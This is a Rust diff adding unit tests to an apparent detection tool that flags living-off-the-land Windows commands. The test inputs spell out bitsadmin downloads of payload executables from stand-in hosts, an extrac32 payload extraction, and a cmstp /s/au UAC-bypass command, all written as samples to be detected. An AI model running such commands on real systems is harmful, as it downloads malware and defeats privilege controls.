@@ -8132,6 +8132,42 @@ mod bitsadmin_tests {
     }
 
     #[test]
+    fn bitsadmin_attached_transfer_emits_download() {
+        let raw =
+            "bitsadmin /transfer:myjob /download /priority foreground http://x/y.exe C:\\temp\\y.exe";
+        let mut env = Environment::new(&Config::default());
+        interpret_line(raw, &mut env);
+
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                Trait::BitsadminDownload { url, dst }
+                    if url == "http://x/y.exe" && dst == "C:\\temp\\y.exe"
+            )),
+            "no attached-transfer BitsadminDownload: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn bitsadmin_attached_priority_does_not_skip_url() {
+        let raw =
+            "bitsadmin /transfer myjob /download /priority:foreground http://x/y.exe C:\\temp\\y.exe";
+        let mut env = Environment::new(&Config::default());
+        interpret_line(raw, &mut env);
+
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                Trait::BitsadminDownload { url, dst }
+                    if url == "http://x/y.exe" && dst == "C:\\temp\\y.exe"
+            )),
+            "attached-priority BitsadminDownload skipped URL: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn bitsadmin_transfer_emits_multiple_download_pairs() {
         let mut env = Environment::new(&Config::default());
         interpret_line(
@@ -8175,6 +8211,24 @@ mod bitsadmin_tests {
                 |t| matches!(t, Trait::Lolbas { name, cmd } if name == "bitsadmin" && cmd == raw)
             ),
             "bitsadmin addfile not marked as LOLBAS: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn bitsadmin_attached_addfile_emits_download() {
+        let raw = r#"bitsadmin /addfile:job1 "https://bits-attached-addfile.example/payload.exe" "C:\Temp\payload.exe""#;
+        let mut env = Environment::new(&Config::default());
+        interpret_line(raw, &mut env);
+
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                Trait::BitsadminDownload { url, dst }
+                    if url == "https://bits-attached-addfile.example/payload.exe"
+                        && dst == "C:\\Temp\\payload.exe"
+            )),
+            "no attached-addfile BitsadminDownload: {:?}",
             env.traits
         );
     }
@@ -8651,6 +8705,25 @@ mod extrac32_tests {
     }
 
     #[test]
+    fn extrac32_l_equals_value_is_not_treated_as_source() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"extrac32 /Y /L="C:\Users\Public" "C:\Users\al\Downloads\payload.cab""#,
+            &mut env,
+        );
+
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                Trait::Extrac32 { src, dst, .. }
+                    if src == r#"C:\Users\al\Downloads\payload.cab"# && dst == r#"C:\Users\Public"#
+            )),
+            "extrac32 /L= value was parsed as positional source: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn extrac32_single_quoted_self_reference_records_trait() {
         let mut env = Environment::new(&Config::default());
         interpret_line(
@@ -8759,6 +8832,21 @@ mod uac_bypass_tests {
                 .iter()
                 .any(|t| matches!(t, Trait::Lolbas { name, cmd } if name == "cmstp" && cmd == raw)),
             "cmstp /au direct command was not marked as LOLBAS: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn cmstp_compact_au_switch_emits_uac_bypass_trait() {
+        let mut env = Environment::new(&Config::default());
+
+        interpret_line(r#"cmstp.exe /s/au C:\Users\Public\stage.inf"#, &mut env);
+
+        assert!(
+            env.traits
+                .iter()
+                .any(|t| matches!(t, Trait::UacBypass { technique } if technique == "cmstp-au")),
+            "cmstp compact /s/au command was not surfaced: {:?}",
             env.traits
         );
     }
